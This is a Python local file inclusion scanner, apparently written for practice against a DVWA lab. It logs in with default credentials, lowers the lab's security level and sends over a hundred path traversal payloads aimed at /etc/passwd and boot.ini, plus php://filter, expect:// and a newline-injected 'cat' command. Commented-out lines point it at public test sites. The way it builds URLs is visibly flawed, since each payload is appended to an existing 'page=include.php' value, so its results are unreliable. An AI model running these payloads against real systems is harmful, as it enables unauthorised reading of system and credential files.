import requests
import sys
import re
from bs4 import BeautifulSoup

# Payloads...
local_file_inclusion = [       
        "../../../../../../../../../../../etc/passwd",      
        "/etc/passwd%2500", "/etc/passwd%00", "/etc/passwd", "///etc///passwd%2500", "///etc///passwd%00", "///etc///passwd", "../etc/passwd%2500", "../etc/passwd%00", "../etc/passwd", "..///etc///passwd%2500", "..///etc///passwd%00", "..///etc///passwd", "..///..///etc///passwd%2500", "..///..///etc///passwd%00", "..///..///etc///passwd", "..///..///..///etc///passwd%2500", "..///..///..///etc///passwd%00", "..///..///..///etc///passwd", "..///..///..///..///etc///passwd%2500", "..///..///..///..///etc///passwd%00", "..///..///..///..///etc///passwd", "..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///..///etc///passwd", "../../etc/passwd%2500", "../../etc/passwd%00", "../../etc/passwd", "../../../etc/passwd%2500", "../../../etc/passwd%00", "../../../etc/passwd", "../../../../etc/passwd%2500", "../../../../etc/passwd%00", "../../../../etc/passwd", "../../../../../../etc/passwd%2500", "../../../../../../etc/passwd%00", "../../../../../../etc/passwd", "../../../../../etc/passwd%00", "../../../../../etc/passwd", "../../../../../../../etc/passwd%2500", "../../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd%2500", "../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd", "\etc\passwd%2500", "\etc\passwd%00", "\etc\passwd", "..\etc\passwd%2500", "..\etc\passwd%00", "..\etc\passwd", "..\..\etc\passwd%2500", "..\..\etc\passwd%00", "..\..\etc\passwd", "..\..\..\etc\passwd%2500", "..\..\..\etc\passwd%00", "..\..\..\etc\passwd", "..\..\..\..\etc\passwd%2500", "..\..\..\..\etc\passwd%00", "..\..\..\..\etc\passwd", "..\..\..\..\..\etc\passwd%2500", "..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\etc\passwd", "..\..\..\..\..\..\etc\passwd%2500", "..\..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\..\etc\passwd", "%00../../../../../../etc/passwd", "%00/etc/passwd%00", "%0a/bin/cat%20/etc/passwd", "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "\'/bin/cat%20/etc/passwd\'", "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd", "/etc/default/passwd","././././././././././././etc/passwd",".//.//.//.//.//.//.//.//.//.//.//.//etc//passwd", "/./././././././././././etc/passwd", "/../../../../../../../../../../etc/passwd", "/../../../../../../../../../../etc/passwd^^", "/../../../../../../../etc/passwd", "/etc/passwd", "../../../../../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd", "../../../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../etc/passwd","../../../../etc/passwd" , "../../../etc/passwd" , "../../etc/passwd" , "../etc/passwd", "../../../../../../../../../../../etc/passwd" , ".\./.\./.\./.\./.\./.\./etc/passwd","\..\..\..\..\..\..\..\..\etc\passwd","etc/passwd", "/etc/passwd%00", "../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../etc/passwd%00", "../../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd%00", "../../../../../../etc/passwd%00", "../../../../../etc/passwd%00", "../../../../etc/passwd%00", "../../../etc/passwd%00","../../etc/passwd%00", "../etc/passwd%00", "\..\..\..\..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\..\..\..\..\..\etc\passwd%00", "../..\..\..\..\..\..\..\..\..\..\etc\passwd%00", "/../../../../../../../../../../../etc/passwd%00.html", "/../../../../../../../../../../../etc/passwd%00.jpg", "../../../../../../etc/passwd&=%3C%3C%3C%3C", "..2fetc2fpasswd", "..2fetc2fpasswd%00", "..2f..2fetc2fpasswd", "..2f..2fetc2fpasswd%00", "..2f..2f..2fetc2fpasswd", "..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini", "../..\../..\../..\../..\../..\../boot.ini", "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../../etc/passwd", "expect://ls"
        ]

def local_file_inclusion_scanning(url, session):
    vulnerability_found = False  # Flag to keep track of vulnerability status
    for payload in local_file_inclusion:
        main_url = url + payload
        try:
            response = session.get(main_url, verify=True)
            # print(response.text)

            if any(vulnerable_keyword in response.text for vulnerable_keyword in ["root", "www-data", "/usr/bin/zsh", "/usr/bin/bash", "0:0"]):
                print("LFI 취약점이 존재합니다.")
                print(main_url)
                print("payload : ", payload)
                vulnerability_found = True  # Set flag to True if vulnerability is found
                break
            elif response.status_code == 200 and "root:x" in response.text:
                print("LFI 취약점이 존재합니다.")
                vulnerability_found = True  # Set flag to True if vulnerability is found
                break
        except requests.RequestException as e:
            print(f"An error occurred while requesting {main_url}: {str(e)}")

    if not vulnerability_found:
        print("LFI 취약점이 존재하지 않습니다.")


# Create a session
session = requests.Session()

# Login attempt
login_url = 'http://192.168.92.133/dvwa/login.php'
login_data = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
OK_MSG = 'Welcome to Damn Vulnerable Web'

resp = session.post(login_url, data=login_data)
soup = BeautifulSoup(resp.text, 'lxml')
contents = soup.h1.string

if re.search(OK_MSG, contents):
    print("---------------------------------------------------------------------------")
    print("[+] Login Successful")
else:
    sys.exit("[-] Login Failed")

# Set DVWA security level to low
security_url = 'http://192.168.92.133/dvwa/security.php'
security_data = {'security': 'low', 'seclev_submit': 'Submit'}
OK_MSG2 = 'Security level set to low'

resp2 = session.post(security_url, data=security_data)
soup2 = BeautifulSoup(resp2.text, 'lxml')
sec_contents = soup2.find('div', class_='message').string

if re.search(OK_MSG2, sec_contents):
    print("[+] Security Level set to low")
    print("---------------------------------------------------------------------------")
else:
    sys.exit("[-] Set to low Failed")

# URL for scanning vulnerabilities

url = "http://192.168.92.133/dvwa/vulnerabilities/fi/?page=include.php"

#url = "http://demo.testfire.net/"
#url = "http://testphp.vulnweb.com/login.php"

# Perform vulnerability scan
local_file_inclusion_scanning(url, session)